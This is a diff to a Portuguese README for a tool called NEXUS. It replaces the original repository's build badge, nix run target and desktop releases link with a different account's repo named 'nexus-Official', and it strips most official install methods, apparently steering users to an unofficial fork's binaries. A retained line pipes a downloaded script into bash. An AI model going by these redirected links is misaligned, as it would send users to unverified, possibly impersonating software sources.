@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://nexus.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/nexus-ai"><img alt="npm" src="https://img.shields.io/npm/v/nexus-ai?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/nexus/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/nexus/publish.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/ravipacharpro-jpg/nexus-Official/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/ravipacharpro-jpg/nexus-Official/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -51,14 +51,9 @@ curl -fsSL https://nexus.ai/install | bash
 
 # Gerenciadores de pacotes
 npm i -g nexus-ai@latest        # ou bun/pnpm/yarn
-scoop install nexus             # Windows
-choco install nexus             # Windows
-brew install anomalyco/tap/nexus # macOS e Linux (recomendado, sempre atualizado)
-brew install nexus              # macOS e Linux (fórmula oficial do brew, atualiza menos)
-sudo pacman -S nexus            # Arch Linux (Stable)
 paru -S nexus-bin               # Arch Linux (Latest from AUR)
 mise use -g nexus               # qualquer sistema
-nix run nixpkgs#nexus           # ou github:anomalyco/nexus para a branch dev mais recente
+nix run github:ravipacharpro-jpg/nexus-Official           # ou github:ravipacharpro-jpg/nexus-Official para a branch dev mais recente
 ```
 
 > [!TIP]
@@ -66,18 +61,16 @@ nix run nixpkgs#nexus           # ou github:anomalyco/nexus para a branch dev ma
 
 ### App desktop (BETA)
 
-O NEXUS também está disponível como aplicativo desktop. Baixe diretamente pela [página de releases](https://github.com/anomalyco/nexus/releases) ou em [nexus.ai/download](https://nexus.ai/download).
+O NEXUS também está disponível como aplicativo desktop. Baixe diretamente pela [página de releases](https://github.com/ravipacharpro-jpg/nexus-Official/releases) ou em [nexus.ai/download](https://nexus.ai/download).
 
 | Plataforma            | Download                           |
 | --------------------- | ---------------------------------- |
 | macOS (Apple Silicon) | `nexus-desktop-mac-arm64.dmg`   |
 | macOS (Intel)         | `nexus-desktop-mac-x64.dmg`     |
-| Windows               | `nexus-desktop-windows-x64.exe` |
+| Windows               | `nexus-desktop-win-x64.exe` |
 | Linux                 | `.deb`, `.rpm` ou AppImage         |
 
 ```bash
-# macOS (Homebrew)
-brew install --cask nexus-desktop
 # Windows (Scoop)
 scoop bucket add extras; scoop install extras/nexus-desktop
 ```
@@ -126,4 +119,3 @@ Se você estiver trabalhando em um projeto relacionado ao NEXUS e estiver usando
 
 ---
 
-**Junte-se à nossa comunidade** [Discord](https://discord.gg/nexus) | [X.com](https://x.com/nexus)
